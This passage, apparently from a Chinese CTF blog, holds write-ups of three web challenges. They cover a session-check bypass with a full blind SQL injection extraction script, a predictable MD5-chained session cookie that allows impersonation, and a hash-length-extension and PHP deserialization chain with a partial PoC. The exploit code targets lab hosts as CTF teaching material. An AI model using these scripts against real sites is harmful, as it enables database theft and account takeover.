class=\"string\">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class=\"line\">print(a.text)</span><br></pre></td></tr></table></figure>\r\n<p>数据包长这样：</p>\r\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/templates/login.php?username=test&amp;password=test</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 192.168.1.2:6385</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: python-requests/2.20.1</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: */*</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: PHPSESSID=test1</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 266</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: multipart/form-data; boundary=5c2bfb7c7c0c48ed9345b1babff33109</span><br><span class=\"line\"></span><br><span class=\"line\">--5c2bfb7c7c0c48ed9345b1babff33109</span><br><span class=\"line\"><span class=\"attribute\">Content-Disposition</span>: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">123456789</span></span><br><span class=\"line\"><span class=\"attribute\">--5c2bfb7c7c0c48ed9345b1babff33109</span></span><br><span class=\"line\"><span class=\"attribute\">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">123456789</span></span><br><span class=\"line\"><span class=\"attribute\">--5c2bfb7c7c0c48ed9345b1babff33109--</span></span><br></pre></td></tr></table></figure>\r\n<p>返回Try again，意味着我们成功的绕过Session检测，可以SQL注入了。这个SQL注入没有任何过滤，直接注就可以了。注意他没有回显，要盲注。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.1.2:6385/templates/login.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123;<span class=\"string\">&quot;file&quot;</span>: <span class=\"string\">&quot;123456789&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"comment\"># get database name</span></span><br><span class=\"line\"><span class=\"comment\"># result = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># for b in range(1, 64):</span></span><br><span class=\"line\"><span class=\"comment\">#     for a in range(10, 200):</span></span><br><span class=\"line\"><span class=\"comment\">#         param = &#123;&#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(b, a),</span></span><br><span class=\"line\"><span class=\"comment\">#                  &#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#         c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           params=param,</span></span><br><span class=\"line\"><span class=\"comment\">#                           #proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#                           )</span></span><br><span class=\"line\"><span class=\"comment\">#         # print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#         if &quot;again&quot; not in c.text:</span></span><br><span class=\"line\"><span class=\"comment\">#             result += chr(a)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(result)</span></span><br><span class=\"line\"><span class=\"comment\"># get table name,we got flag_tbl and ptbctf by changing limit</span></span><br><span class=\"line\"><span class=\"comment\"># result = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># for b in range(1, 64):</span></span><br><span class=\"line\"><span class=\"comment\">#     for a in range(10, 200):</span></span><br><span class=\"line\"><span class=\"comment\">#         param = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#             &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(</span></span><br><span class=\"line\"><span class=\"comment\">#                 b, a),</span></span><br><span class=\"line\"><span class=\"comment\">#             &#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#         c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           params=param,</span></span><br><span class=\"line\"><span class=\"comment\">#                           # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#                           )</span></span><br><span class=\"line\"><span class=\"comment\">#         # print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#         if &quot;again&quot; not in c.text:</span></span><br><span class=\"line\"><span class=\"comment\">#             result += chr(a)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(result)</span></span><br><span class=\"line\"><span class=\"comment\"># get column name of flag_tbl,we got secret</span></span><br><span class=\"line\"><span class=\"comment\"># result = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># for b in range(1, 64):</span></span><br><span class=\"line\"><span class=\"comment\">#     for a in range(10, 200):</span></span><br><span class=\"line\"><span class=\"comment\">#         param = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#             &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag_tbl&quot; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(</span></span><br><span class=\"line\"><span class=\"comment\">#                 b, a),</span></span><br><span class=\"line\"><span class=\"comment\">#             &#x27;password&#x27;: &#x27;test&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#         c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#                           params=param,</span></span><br><span class=\"line\"><span class=\"comment\">#                           # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#                           )</span></span><br><span class=\"line\"><span class=\"comment\">#         # print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#         if &quot;again&quot; not in c.text:</span></span><br><span class=\"line\"><span class=\"comment\">#             result += chr(a)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(c.text)</span></span><br><span class=\"line\"><span class=\"comment\">#             print(result)</span></span><br><span class=\"line\"><span class=\"comment\"># get column name of flag_tbl,we got secret</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">64</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>, <span class=\"number\">200</span>):</span><br><span class=\"line\">        param = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;test&quot; or if(ascii(substr((select secret from flag_tbl),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;</span>.format(</span><br><span class=\"line\">                b, a),</span><br><span class=\"line\">            <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">&#x27;test&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        c = requests.post(url=url, files=files, data=&#123;<span class=\"string\">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class=\"string\">&quot;123456789&quot;</span>&#125;,</span><br><span class=\"line\">                          cookies=&#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>&#125;,</span><br><span class=\"line\">                          params=param,</span><br><span class=\"line\">                          <span class=\"comment\"># proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class=\"line\">                          )</span><br><span class=\"line\">        <span class=\"comment\"># print(c.text)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;again&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> c.text:</span><br><span class=\"line\">            result += chr(a)</span><br><span class=\"line\">            print(c.text)</span><br><span class=\"line\">            print(result)</span><br></pre></td></tr></table></figure>\r\n\n    <div id=\"aplayer-asmLhZPY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"63650\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{03147e79-2ad9-45cf-9c25-c77289f18346}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","SQL注入","盲注","Session","addslashes","PHP_SESSION_UPLOAD_PROGRESS"]},{"title":"RuCTF2019-beacons","url":"/2019/09/01/RuCTF2019-beacons/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>RuCTF 2019 Final是一个线上AWD比赛。今天看一下其中的beacons题。RuCTF的flag不会保存在文件中，基本都在数据库中。</p>\r\n<p>Python 3.6 Sanic框架+MongoDB。Sanic框架跟flask的语法其实感觉有点像，也是一个MVC框架，controllers的代码在controllers目录下。我打AWD喜欢黑白盒同时用。本题的flag保存在随机用户中的某个beacon信息中。 <a id=\"more\"></a> 打开就让你登录或者注册。我们先看login.py吧。login的时候用户名和密码不能超40个字符。注册同理，用户名和密码只允许出现[A-Za-z0-9_]这些字符，注册的时候会写入用户名(name)、密码(password)、beacons和一个invites，invites是通过get_invites()函数生成的，大致上就是随机生成200个随机UUID字符串。</p>\r\n<p>controllers其余的函数所要求的@auth.login_required注解来源于sessions.py。这里表明，该程序使用名为session的Cookie用于表示身份。注意下列代码： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_cookie_gen</span>(<span class=\"params\">self, cookie=<span class=\"string\">&#x27;&#x27;</span></span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        cookie = hashlib.md5(cookie.encode()).hexdigest()</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> cookie</span><br></pre></td></tr></table></figure></p>\r\n<p>cookie生成方式为对上一cookie进行md5 hash，最初的cookie为空。这就是此题的漏洞点一：cookie完全可预测。实测www.cmd5.com等网站对于md5(md5())加密支持良好，因此我们完全可以通过对现有cookie进行解密，得到上一登录用户的cookie，进而冒充登录。然后我们就可以得到相应的beacon信息。</p>\r\n<p>回到正常流程来。在登陆后进入主页面。这部分在controllers下的map.py中。渲染map.html，接受用户对地图的点击参数，通过center_x和center_y接受X和Y值。然后get_beacons()函数查询(center_x,center_y)所指位置是否有beacon。</p>\r\n<p>在beacon.py中，我们可以添加beacon，要求name不大于25个字符，且只能出现[A-Za-z0-9_]中的字符，comment不大于255个字符，且只能出现[A-Za-z0-9_!?.,=']中的字符。每个用户只能创建至多200个beacon，坐标不能重复。用户发布private的beacon后可以通过invites共享给其他用户。invites从创建用户时的invites取值。而创建public的beacon时是全网站用户都可以看到的。创建beacon后可以上传照片。上传的照片通过content-type获取，为image/jpg,image/jpeg,image/tiff这三种之一。而访问/Beacon/GetUserBeacons可以获得当前用户的beacon信息，访问/Beacon/&lt;beaconid&gt;可以获取单独beacon的信息。</p>\r\n<p>photo_controller.py中，我们可以访问/Photo/GetLatest获得最近public的beacon的照片，/Photo/GetPhoto/&lt;photoid&gt;获取photo的信息。</p>\r\n\n    <div id=\"aplayer-kKKBHrUT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"1934618\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{9cdcdbbf-1c2b-40da-92d9-042d777cbf5e}</p>\r\n","categories":["Writeups"],"tags":["Python","RuCTF","Sanic","MongoDB"]},{"title":"SWPUCTF-2016-Web400","url":"/2019/09/13/SWPUCTF-2016-Web400/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SWPUCTF 2016的Web400。 是个PHP的博客系统，扫目录发现了一个web.zip。好了，源码审计。 先看一下index.php，发现实现的注册与登录都没有进行任何SQL过滤，但不知道有什么用。common.php是公共引用的文件，其中有我们十分感兴趣的代码。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">Array</span>(<span class=\"string\">&quot;_POST&quot;</span>, <span class=\"string\">&quot;_GET&quot;</span>, <span class=\"string\">&quot;_COOKIE&quot;</span>) <span class=\"keyword\">as</span> $key) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($$key <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (is_array($v)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;hello,hacker!&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $k[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;_&#x27;</span> ? $$k = addslashes($v) : $$k = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> PHP中$$代表以某一变量名作为变量名的变量，因此foreach循环中的$$key as $k =&gt; <span class=\"math inline\">\\(v，等同于将上面提到的Array(&quot;\\_POST&quot;, &quot;\\_GET&quot;, &quot;\\_COOKIE&quot;)这几个数组分别拆成\\)</span>k和<span class=\"math inline\">\\(v，其中\\)</span>k指“_POST”等数组内元素的名字，<span class=\"math inline\">\\(v指\\)</span>k对应的值。如果<span class=\"math inline\">\\(v是个数组则die，如果我们传入`/?c[]=1`，就会die。不是数组的话就会将\\)</span>k数组的第一项addslashes()，就是说我们传入<code>/?c=\"1\"</code>，_GET数组的第一项就是c，那么实际上_GET['c']==_GET[0]的值是<code>\\\"1\\\"</code>。因此就有一个变量覆盖，我们可以任意对变量赋值。但是有个问题，这段代码在common.php中，其余所有文件是在文件头部include('common.php')的，我们的变量覆盖又只能控制数组的第一个变量，因此对于文件需要的传参，它实际上又会被覆盖掉，因此我们只能覆盖从未声明的变量。 然后在riji.php中我们有如下代码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">&#x27;user&#x27;</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">&#x27;user&#x27;</span>];</span><br><span class=\"line\">    @mysql_conn();</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;select * from user where name=&#x27;$username&#x27;&quot;</span>;</span><br><span class=\"line\">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class=\"line\">    mysql_close();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($result[<span class=\"string\">&#x27;userid&#x27;</span>]) &#123;</span><br><span class=\"line\">        $id = intval($result[<span class=\"string\">&#x27;userid&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 我们正常登录后<span class=\"math inline\">\\(\\_SESSION[&#39;user&#39;]会赋值\\)</span>username，但如果登陆后此时我们把数据库中<span class=\"math inline\">\\(username的记录删掉，那么if判断就会为false，\\)</span>id没有被赋值，我们就可以控制了。 riji.php中还有一段代码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  @mysql_conn();</span><br><span class=\"line\">  $sql1 = <span class=\"string\">&quot;select * from msg where userid= $id order by id&quot;</span>;</span><br><span class=\"line\">  $query = mysql_query($sql1);</span><br><span class=\"line\">  $result1 = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class=\"line\">      $result1[] = $temp;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  mysql_close();</span><br><span class=\"line\">  <span class=\"keyword\">foreach</span> ($result1 <span class=\"keyword\">as</span> $x =&gt; $o) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> display($o[<span class=\"string\">&#x27;msg&#x27;</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> <span class=\"math inline\">\\(id会直接带入查询，注意SQL语句中\\)</span>id没有引号，那么我们传入<code>1' or 1=1</code>，全局addslashes()后变成<code>1\\' or 1=1</code>，addslashes()对于SQL注入没有任何影响。虽然不知道SQL注入有什么用。 然后api.php声明了一个admin类，其中确实有删除用户的方法。该文件最后两行直接<span class=\"math inline\">\\(a=unserialize(base64_decode(\\)</span>api))，然后do_method，<span class=\"math inline\">\\(a与\\)</span>api都没有后赋值，可以变量覆盖。但是在del_user之前我们要先过了check，check中检查类的check变量是否等于MD5（用户注册时的salt+类data变量+用户名），然后还检查用户的role是否为1。在源码中给出的db.sql中我们发现admin用户的role为1，但是我们不知道其salt。 然后在forget.php中我们看到如下代码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (@$forget == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @mysql_conn();</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;select * from user where name=&#x27;$username&#x27;&quot;</span>;</span><br><span class=\"line\">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class=\"line\">    mysql_close();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($result)) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($result[<span class=\"string\">&#x27;salt&#x27;</span>]) &#123;</span><br><span class=\"line\">            $check = base64_encode(md5($result[<span class=\"string\">&#x27;salt&#x27;</span>]));</span><br><span class=\"line\">            $name = $result[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">            header(<span class=\"string\">&quot;Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 我们输入用户名，查到有此用户后会带出来md5(salt)。 好了，现在我们已知md5(salt)，类data与用户名（admin）可控，要求md5(salt+data+\"admin\")，这就是哈希扩展攻击了。哈希扩展攻击参考<a href=\"https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\">这个</a>，简单来说就是针对SHA、MD5这类Hash算法，如果我们不知道特定密文c，但是知道知道MD5/SHA(c+pad)与密文c的长度，其中pad我们可控，那么我们就可以求出MD5(salt+pad+m)，其中m为任意数据。 我们用<a href=\"https://github.com/JoyChou93/md5-extension-attack\">这个工具</a>，用于已知密文MD5，求MD5(密文+pad)的情况。 好了，可以开始反序列化了。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">admin</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $name=<span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $check=<span class=\"string\">&quot;0f85487590dd2a3182389623cc8e3933&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $data=<span class=\"string\">&quot;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $method=<span class=\"string\">&quot;del_msg&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $userid=<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $msgid;</span><br><span class=\"line\"><span class=\"comment\">//&gt;&gt;&gt; hashpumpy.hashpump(&#x27;ceb20772e0c9d240c75eb26b0e37abee&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;,16)</span></span><br><span class=\"line\"><span class=\"comment\">//(&#x27;0f85487590dd2a3182389623cc8e3933&#x27;, b&#x27;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin&#x27;)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=serialize(<span class=\"keyword\">new</span> admin());</span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure> userid置为2的原因是我们注册新用户的时候userid已经为2了，可以从Cookie中看到。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (@$login == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @mysql_conn();</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;select * from user where name=&#x27;$username&#x27;&quot;</span>;</span><br><span class=\"line\">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class=\"line\">    mysql_close();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($result)) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($result[<span class=\"string\">&#x27;passwd&#x27;</span>] == md5($password)) &#123;</span><br><span class=\"line\">            $user_cookie = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            $user_cookie .= $result[<span class=\"string\">&#x27;userid&#x27;</span>];</span><br><span class=\"line\">            $user_cookie .= $result[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">            $user_cookie .= $result[<span class=\"string\">&#x27;salt&#x27;</span>];</span><br><span class=\"line\">            $cookies = base64_encode($user_cookie);</span><br><span class=\"line\">            <span class=\"comment\">//$cookies = $user_cookie;</span></span><br><span class=\"line\">            setcookie(<span class=\"string\">&quot;user&quot;</span>, $cookies, time() + <span class=\"number\">60</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">&#x27;login&#x27;</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">&#x27;user&#x27;</span>] = $username;</span><br><span class=\"line\">            header(<span class=\"string\">&#x27;Location:/riji.php&#x27;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 我们Base64解码一下就OK了。生成的结果传给api.php/?api=就行了，需要注意的是api.php在开头设置了$_SESSION['login']==1的判断，因此我们需要另外起一个窗口发api.php，然后我们返回最开始的登录页面，发现登录状态没有消失，这时SQL注入可以利用了，正常SQL注入流程，除引号外没有任何过滤。提交/riji.php?id=-1 union select 1,2,flag from flag就可以得到flag了。 PoC： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib.parse <span class=\"keyword\">import</span> unquote, parse_qs</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"string\">&quot;http://192.168.1.4:5354/&quot;</span></span><br><span class=\"line\">a = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span>(<span class=\"params\">a: requests.Session</span>) -&gt; str:</span></span><br><span class=\"line\">    username = <span class=\"string\">&quot;&quot;</span>.join(random.sample(string.ascii_letters, <span class=\"number\">6</span>))</span><br><span class=\"line\">    b = a.post(addr + <span class=\"string\">&quot;index.php&quot;</span>, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;username&quot;</span>: username,</span><br><span class=\"line\">        <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;mibao&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;regi&quot;</span>: <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    print(b.text)</span><br><span class=\"line\">    print(<span class=\"string\">&quot;Username is &quot;</span> + username)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> username</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">a: requests.Session, username: str</span>) -&gt; int:</span></span><br><span class=\"line\">    b = a.post(addr + <span class=\"string\">&quot;index.php&quot;</span>, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;username&quot;</span>: username,</span><br><span class=\"line\">        <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;mibao&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;login&quot;</span>: <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    print(b.text)</span><br><span class=\"line\">    userid = (b64decode(unquote(a.cookies.get(<span class=\"string\">&#x27;user&#x27;</span>)).encode())[</span><br><span class=\"line\">              :b64decode(unquote(a.cookies.get(<span class=\"string\">&#x27;user&#x27;</span>)).encode()).find(username.encode())])</span><br><span class=\"line\">    <span class=\"comment\"># userid=b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode()).find(username.encode())</span></span><br><span class=\"line\">    print(userid.decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(userid.decode())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_admin_md5</span>() 